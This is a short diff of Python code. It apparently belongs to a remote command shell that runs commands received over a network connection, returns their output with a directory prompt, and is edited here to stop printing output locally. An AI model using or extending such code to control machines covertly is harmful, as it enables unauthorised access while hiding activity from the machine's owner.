@@ -72,7 +72,7 @@ def execute_command(command,connection):
         output_str = str(output_byte,"utf-8") or "Command Exectuted Successfully."
         currentWD = os.getcwd() + "> " 
         connection.send(str.encode( currentWD + output_str ))
-        print(output_str)
+        #print(output_str)
     check_commands(connection)
 
 
